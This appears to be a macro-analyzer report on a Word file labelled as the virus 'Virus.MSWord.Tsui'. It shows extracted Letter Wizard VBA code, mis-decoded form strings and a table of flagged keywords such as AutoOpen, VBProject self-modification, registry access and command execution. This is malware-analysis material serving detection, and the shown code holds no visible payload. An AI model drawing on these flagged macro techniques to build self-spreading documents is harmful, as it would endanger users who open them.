    RstDlgValPref "LetterHeadPosition", 0
    gCurrentHeadingPosition = -1
    Select Case WordBasic.DlgValue(StateItems__(4 - 1) + 1) 'LetterHeadPosition
        Case 0
            a$ = "AtTheTop"
        Case 1
            a$ = "OnTheLeft"
        Case 2
            a$ = "OnTheRight"
        Case Else
            WordBasic.MsgBox "Internal error (LHP bad)", wizname$, 16
    End Select
    WordBasic.DlgText "tip5text", WordBasic.[GetAutoText$]("tip5" + a$, 1)
    unit = GetDefaultUnits
    RstDlgPref "textLetterheadSpace", PrettyMeasurement$(ConvertInchesToUnits(2, unit), unit)
'5
    RstDlgMultiLinePref "textRecipientAddress", WordBasic.[GetAutoText$]("prefRecipientAddress", 1)
    RstDlgMultiLinePref "textReturnAddress", toui.Address
'6
    RstDlgValPref "WizStyle", 0
'finish
    RstDlgValPref "HelpOrEnvelope", 1
    PickStylePreview
    If WordBasic.DlgValue("UseLetterhead") = 0 Then UpdateHeadingPosition
    WordBasic.PrintStatusBar kRstStylesheet$
'======================================
    def$ = WordBasic.[GetDocumentVar$]("LetterName")
    If def$ <> "" Then      'oh, goody: Mr. Resume is bossing me around again. Joy, joy.
        WordBasic.PrintStatusBar kLookingFor$ + chQuote$ + def$ + chQuote$ + "..."
        WordBasic.DlgValue "LetterMethod", 0    'prewritten
        WordBasic.DlgText "tip1text", WordBasic.[GetAutoText$]("tip1optlm" + WordBasic.[LTrim$](Str(WordBasic.DlgValue(11) + 1)), 1) 'For Prewritten Letters
    End If
    WordBasic.PrintStatusBar ""
End Sub

'======================================================
'%% Common Wizard Routines

Private Sub VerifyEnvirons()
Dim wind$
Dim fBadDoc
    Dim howser As Object: Set howser = WordBasic.DialogRecord.ToolsOptionsGeneral(False)
    WordBasic.CurValues.ToolsOptionsGeneral howser
    gDoogie = howser.BlueScreen
    WordBasic.ToolsOptionsGeneral BlueScreen:=0
    WordBasic.ScreenUpdating 0
    WordBasic.DisableInput  'Disable ESCape (works correctly in dialog)
    wind$ = WordBasic.[FileNameFromWindow$]()
    If wind$ <> "" Then fBadDoc = 1
    If WordBasic.IsMacro() Or InStr(wind$, ".") <> 0 Then
         fBadDoc = 1
    Else
        WordBasic.EditSelectAll
        If Len(WordBasic.[Selection$]()) > 1 Then fBadDoc = 1
    End If
    If fBadDoc Then
        WordBasic.MsgBox kErrBadDoc$, kWizname$, 16
        Error 1302
    End If
'After all that, the document may still be bogus (even if we created a new one above!)
    WordBasic.EditSelectAll 'Clear it out
    WordBasic.WW6_EditClear
    workDoc$ = WordBasic.[WindowName$]()    'get name of working doc's window
    WordBasic.DisableAutoMacros 1       'make sure no macros are executed!
    On Error GoTo -1: On Error GoTo FatalError
    WordBasic.FileNewDefault            'create a new, empty window
    WordBasic.DisableAutoMacros 0       're-enable auto macros
'grab page setup options
    Dim dlgPgSetup1 As Object: Set dlgPgSetup1 = WordBasic.DialogRecord.FilePageSetup(False)
    Dim dlgPgSetup2 As Object: Set dlgPgSetup2 = WordBasic.DialogRecord.FilePageSetup(False)
    WordBasic.CurValues.FilePageSetup dlgPgSetup1
    iEmptyDoc = WordBasic.Window()      'get window # of this doc
    emptyDoc$ = WordBasic.[WindowName$]()
    iWorkDoc = 1
    While (WordBasic.[WindowName$](iWorkDoc) <> workDoc$) 'find our original window
        iWorkDoc = iWorkDoc + 1
    Wend
    WordBasic.WindowList (iWorkDoc)     'switch back to working doc
    WordBasic.CurValues.FilePageSetup dlgPgSetup2
    If dlgPgSetup1.Orientation <> dlgPgSetup2.Orientation Then 'need to swap page dimensions
        With ActiveDocument.PageSetup
            .PageWidth = CentimetersToPoints(Val(dlgPgSetup1.PageHeight))
            .PageHeight = CentimetersToPoints(Val(dlgPgSetup1.PageWidth))
        End With
    Else
        With ActiveDocument.PageSetup
            .PageWidth = CentimetersToPoints(Val(dlgPgSetup1.PageWidth))
            .PageHeight = CentimetersToPoints(Val(dlgPgSetup1.PageHeight))
        End With
    End If
    GoTo NoError

FatalError:
    WordBasic.DisableAutoMacros 0
    On Error GoTo -1: On Error GoTo 0

NoError:

End Sub

'=====================================

Private Sub xStorePref(id$, val_$)
Dim v$
    If val_$ = "" Then v$ = "~" Else v$ = val_$
    WordBasic.SetPrivateProfileString kWizname$, id$, v$, Environ("windir") + "\wordwiz.ini"
End Sub

Private Function xFetchPref$(id$)
    xFetchPref$ = WordBasic.[GetPrivateProfileString$](kWizname$, id$, Environ("windir") + "\wordwiz.ini")
End Function

Private Sub SaveDlgValPref(id$)
    xStorePref id$, Str(1 + WordBasic.DlgValue(id$))
End Sub

Private Sub RstDlgValPref(id$, defaultVal)
Dim v
Dim nerr
    v = WordBasic.Val(WordBasic.[GetPrivateProfileString$](kWizname$, id$, "wordwiz.ini")) - 1  'get the value
    If v < 0 Then v = defaultVal    'ensure legal value (unless too big...)
    On Error GoTo -1: On Error GoTo TooBig
    WordBasic.DlgValue id$, v
    GoTo rdvpexit
TooBig:
    nerr = Err.Number
    On Error GoTo -1: On Error GoTo 0
    If nerr = 9 Then    'subscript out of range ... v is too big
        WordBasic.DlgValue id$, defaultVal
    Else
        WordBasic.ScreenUpdating -1 'make sure this is turned on
        Error nerr  'report the err
    End If
rdvpexit:
End Sub

Private Sub SaveDlgPref(id$)
    xStorePref id$, WordBasic.[DlgText$](id$)
End Sub

Private Sub RstDlgPref(id$, defaultStr$)
Dim v$
    v$ = WordBasic.[GetPrivateProfileString$](kWizname$, id$, "wordwiz.ini")
    If v$ = "" Then v$ = defaultStr$
    If v$ = "~" Then v$ = ""
    WordBasic.DlgText id$, v$
End Sub

Private Sub SaveDlgMultiLinePref(id$)
Dim v$
Dim idx
Dim count_
    v$ = WordBasic.[DlgText$](id$)
    idx = InStr(v$, Chr(13))
    count_ = 1
    While (idx > 0)
        xStorePref id$ + WordBasic.[LTrim$](Str(count_)), WordBasic.[Left$](v$, idx - 1)
        If Len(v$) > idx Then v$ = Mid(v$, idx + 1) Else v$ = ""
        idx = InStr(v$, Chr(13))
        count_ = count_ + 1
    Wend
    xStorePref id$ + WordBasic.[LTrim$](Str(count_)), v$
    xStorePref id$ + "Lines", Str(count_)
End Sub

Private Sub RstDlgMultiLinePref(id$, defaultStr$)
Dim count_
Dim v$
Dim f$
    count_ = WordBasic.Val(xFetchPref$(id$ + "Lines"))
    If count_ = 0 Then
        v$ = defaultStr$
    Else
        v$ = xFetchPref$(id$ + WordBasic.[LTrim$](Str(count_)))
        If v$ = "~" Then v$ = ""
        count_ = count_ - 1
        While count_ > 0
            f$ = xFetchPref$(id$ + WordBasic.[LTrim$](Str(count_)))
            If f$ = "~" Then f$ = ""
            v$ = f$ + Chr(13) + v$
            count_ = count_ - 1
        Wend
    End If
    WordBasic.DlgText id$, v$
End Sub

'===

Private Sub ItemsInState(howMany)
    LastState = LastState + 1
    StateItems__(LastState) = howMany + StateItems__(LastState - 1)
End Sub

Private Sub EnableControls() 'Enable/Disable controls
    If State > 1 Then
        WordBasic.DlgEnable 5, 1 '<Back
    End If
    If State < LastState Then
        WordBasic.DlgEnable 6, 1 'Next>
    End If
    If State = 1 Then
        WordBasic.DlgFocus 6 'Next>
        WordBasic.DlgEnable 5, 0 '<Back
    ElseIf State = LastState Then
        WordBasic.DlgFocus 7 'finish
        WordBasic.DlgEnable 6, 0 'Next
    End If
End Sub 'EnableControls


Private Sub SHControls(FirstField, LimField, SH) 'Show/Hide controls
Dim iField
    For iField = FirstField To LimField - 1
        WordBasic.DlgVisible iField, SH
    Next
End Sub 'SHControls

Private Sub EnabFields(FirstField, LimField, ED) 'Enable/Disable controls
Dim iField
    For iField = FirstField To LimField - 1
        WordBasic.DlgEnable iField, ED
    Next
End Sub 'EnabFields

Private Sub ChangeState(sold, snew)
    SHControls (StateItems__(sold - 1)), (StateItems__(sold)), 0
    If HideFilePreview__(snew) - HideFilePreview__(sold) Then
        WordBasic.DlgVisible 8
    End If
    SHControls (StateItems__(snew - 1)), (StateItems__(snew)), 1
    State = snew
    If snew = 2 And WordBasic.DlgValue("LetterMethod") = 1 Then
        WordBasic.DlgVisible "chkloID", 0
        WordBasic.DlgVisible "chkloWriterInitials", 0
        WordBasic.DlgVisible "chkloTypistInitials", 0
        WordBasic.DlgVisible "chkloCC", 0
        WordBasic.DlgVisible "chkloEnclosures", 0
        WordBasic.DlgVisible "chkloAttachments", 0
    End If
    Rem Chk if MAPI environment is present to enable AddressBook buttons
    If snew = 5 Then
        WordBasic.DlgEnable 43, 0 - WordBasic.CommandValid(kInsertAddress$)
        WordBasic.DlgEnable 44, 0 - WordBasic.CommandValid(kInsertAddress$)
    End If
    EnableControls
End Sub 'ChangeState

'%%%% Wizard Dialog Control Function %%%
Private Function DlgControl(id$, iaction, wvalue)
Dim fRet
Dim idnum
Dim result
    fRet = 1
    Select Case iaction
        Case 1  'Init
            State = 1
            WordBasic.DlgVisible 2 'Hide OK button
            WordBasic.DlgVisible 3 'Hide Hint button (no hints)
            RstDialog   'restore dialog settings
            SHControls (StateItems__(0)), (StateItems__(LastState)), 0 'Hide ALL states
            SHControls (StateItems__(State - 1)), (StateItems__(State)), 1 'Show initial state
            If HideFilePreview__(State) <> 0 Then WordBasic.DlgVisible 8
            EnableControls 'Enable/Disable controls
            WordBasic.DlgFocus 6 'Next>
            fRet = 0
        Case 2  'Click
            idnum = WordBasic.DlgControlId(id$)
            result = DoButtonClick(id$, idnum)
            If result = 0 Then
                Select Case idnum
                Case 4 'Cancel
                    fRet = 0 'exit dialog
                Case 5 '<Back
                    ChangeState State, PrevState(State)
                Case 6 'Next>
                    ChangeState State, NextState(State)
                Case 43 'Address Book To DAPFEL
                    SetAddress (1)
                    WordBasic.DlgFocus 40
                Case 44 'Address Book Return DAPFEL
                    SetAddress (2)
                    WordBasic.DlgFocus 42
                Case Else
                    'not gunna happen
                End Select
            ElseIf result = 1 Then
                SaveDialog 'save settings
                fRet = 0
            End If
        Case 3 'Item contents changed
            ' do nothing
        Case 4 'item focus changed
            ItemFocusChanged id$, wvalue
        Case 5 'idle
            WordBasic.PrintStatusBar "" 'clear status bar
            If WordBasic.Window() = iEmptyDoc Then WordBasic.WindowList (iWorkDoc) 'bring work to front
        Case 6 'updated forced (by moving dialog)
            WordBasic.WindowList (iEmptyDoc)    'bring the empty window to the fore
        Case Else
    End Select
    DlgControl = fRet
End Function 'DlgControl

Private Function StrWizardPath() As String
    Dim strPath As String
    Dim strFileName As String
    Dim i As Integer
    Dim fFound As Boolean

    On Error GoTo FatalError
    
    fFound = True
    strPath = objWizTemplate.path

    If (Len(strPath) = 0) Then
        ' New template based on Wizard
        ' Get location of templates - first look in UserTemplatesPath
        ' and then in Workgroup path
        i = 0
        fFound = False
        strPath = Application.Options.DefaultFilePath(wdUserTemplatesPath)
        
        While ((i < 2) And fFound = False)
            If (Len(strPath) <> 0) Then
                ' First try to find wizard with long filename
                WordBasic.FileFind SearchPath:=strPath, Name:=kWizname$ & strWIZ, SubDir:=1, MatchCase:=0
                If WordBasic.CountFoundFiles() = 0 Then
                    ' Try to find wizard with short filename
                    WordBasic.FileFind SearchPath:=strPath, Name:=strWizShortName & strWIZ, SubDir:=1, MatchCase:=0
                    If WordBasic.CountFoundFiles() <> 0 Then fFound = True
                Else
                    fFound = True
                End If
            End If
        
            i = i + 1
            strPath = Application.Options.DefaultFilePath(wdWorkgroupTemplatesPath)
        Wend
        
        If (fFound) Then ' Wizard was found, so save path
            strFileName = WordBasic.[FoundFileName$](1)
            strPath = WordBasic.[FileNameInfo$](strFileName, 5)
        End If
    End If

    If (fFound) Then
        strPathSeparator = Application.PathSeparator
        If Right$(strPath, 1) <> strPathSeparator Then strPath = strPath & strPathSeparator
        StrWizardPath = strPath
        Exit Function
    End If

LWizardMissing:
    MsgBox strERR_WIZ_NOT_FOUND
    
FatalError:
    ReportError Err
End Function ' StrWizardPath


'main error reporting routine called for fatal errors in the wizard
'SHOULD NOT BE CALLED FOR POST-WIZARD ERRORS
Public Sub ReportError(ByVal ErrorCode As ErrObject)
    Dim lErrorCode As Long
    Dim strErrorMsg As String
    
    lErrorCode = ErrorCode.Number
    strErrorMsg = ErrorCode.Description
    
    'The next statement seems to reset the ErrorCode object,
    'even though it is a ByVal argument
    On Error Resume Next
    
    ResetWizardEnvironment (True)
    
    If fBalloonVisible Then objAssistantBalloon.Close
    If lErrorCode Then DisplayErrorMsg strErrorMsg
    If lAssistantId Then Assistant.EndWizard lAssistantId, False '2nd parameter is fSuccess
    
    If (Not (formWizard Is Nothing)) Then
        formWizard.Hide
        Unload formWizard
        Set formWizard = Nothing
    End If
    
    'ReportError is not called in post-wizard option errors.
    'So, always closing the doc.
    ActiveDocument.Close wdDoNotSaveChanges 'ActiveDocument assumed to be set
    
    'terminate the wizard
    End

End Sub ' ReportError

-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P�N.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�S�mg
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
͑�e	�eQ.
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�{�O
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_AQ1��`�P�N�S͑�e	�eQ��R!hck
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0�P�N0	c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
\��R!hck
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��vX[0R 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�v�e�e�N-N
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0x��S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
0͑�e	�eQ0
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��N�O�_ 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�P�N�e�N-N	�eQ��R!hck
-------------------------------------------------------------------------------
VBA FORM Variable "b'btnBackup'" IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'btnClose'" IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'btnRestore'" IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.Tsui-82d6fb58a508aaf3833429f57aa38c838ac5fd1e2a2c69ad042796f1750500b4' - OLE stream: 'Macros/UF01'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |btnBackup_Click     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|environment         |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|FindWindow          |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|RegCloseKey         |May read or write registry keys              |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|.Variables          |May use Word Document Variables to store and |
|          |                    |hide data                                    |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.microsoft|URL                                          |
|          |.com/isapi/redir.dll|                                             |
|          |?                   |                                             |
|IOC       |http://www.microsoft|URL                                          |
|          |.com/isapi/redir.dll|                                             |
|          |?PRD=Word&SBP=ia&PVE|                                             |
|          |R=8.0&AR=templates  |                                             |
|IOC       |redir.dll           |Executable file name                         |
|IOC       |advapi32.dll        |Executable file name                         |
|IOC       |user.exe            |Executable file name                         |
|IOC       |user32.dll          |Executable file name                         |
|Base64    |P-5                 |UC01                                         |
|String    |                    |                                             |
|Base64    |P]5                 |UF01                                         |
|String    |                    |                                             |
+----------+--------------------+---------------------------------------------+

